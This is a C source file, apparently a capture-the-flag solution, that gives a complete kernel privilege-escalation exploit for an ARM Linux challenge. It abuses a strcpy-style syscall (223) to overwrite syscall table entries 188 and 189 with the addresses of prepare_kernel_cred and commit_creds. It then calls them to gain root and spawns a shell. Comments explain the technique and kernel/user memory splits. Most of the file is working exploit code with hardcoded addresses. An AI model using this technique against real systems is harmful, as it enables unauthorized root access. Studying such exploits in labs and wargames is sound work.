//basic kernel pwning
/*
Required knowledge:
	/proc/kallsyms storest the address of all syscalls (if kaslr is not on)
	prepare_kernel_cred(NULL) : prepares a structurewith root credit
	commit_creds(struct) : commits the prepared credit back to original process


Exploit:
	the given systemcall strcpy and overwrite arbitrary location
	so overwrite and syscall 188/189 to prepare_kernel_cred()/commit_creds() addr, and call them to raise privilege
	a little tricky part here is that the OS is in arm, so spend some time figuring out nop instruction


Additional Notes:
	Traditionally, x86 computers divide virtual memory space into two parts
	The higher 1GB for kernel(0xc0000000~0xffffffff) and lower 3GB for user

	Windows take the default division of 2GB each (kernel 0x800000000 up)
	Though user can activate the 3GB switch to acheive the split as x86

	32 bit arm has choices of VMSPLIT_3G, VMSPLIT_2G, VMSPLIT_1G
	meaning the user space takes lower1G/2G/3G (int his problem 2G is taken)
	
	x64 systems has much larger space, thus
	kernels space spans upper 256TB(0xffff000000000000~0xffffffffffffffff)
	while user space takes the rest
*/

#include <unistd.h>
#include <stdio.h>
#define SYS_CALL_TABLE 0x8000e348
#define PREPARE_KERNEL_CRED 0x8003f924
#define COMMIT_CREDS 0x8003f560		//0x8003f56c  '\x6c' is low_case, so adding padding to '\x60'
#define SYS_EMPTY_A 188
#define SYS_EMPTY_B 189
int main() {
    unsigned int* sct = (unsigned int*)SYS_CALL_TABLE;
    char nop[] = "\x01\x10\xa0\xe1";  //rasm2 -a arm 'mov r1,r1'
    char buf[20];
    int i;
    for(i = 0;i<12;i++){
        buf[i] = nop[i % 4];
    }
    buf[12] = 0;
    syscall(223, buf, COMMIT_CREDS);
    puts("Stage 1 - add padding");
    syscall(223, "\x24\xf9\x03\x80", sct + SYS_EMPTY_A);
    syscall(223, "\x60\xf5\x03\x80", sct + SYS_EMPTY_B);
    puts("Stage 2 - overwrite syscall table");
    syscall(SYS_EMPTY_B, syscall(SYS_EMPTY_A, 0));
    puts("Stage 3 - set new cred");
    system("/bin/sh");
    return 0;
}

//Congratz!! addr_limit looks quite IMPORTANT now... huh?


/*
Reference
	x64 kernel
		https://manybutfinite.com/post/anatomy-of-a-program-in-memory/
	ARM kernel
		http://thinkiii.blogspot.com/2014/02/arm32-linux-kernel-virtual-address-space.html
	x64 kernel
		https://www.codemachine.com/article_x64kvas.html
*/
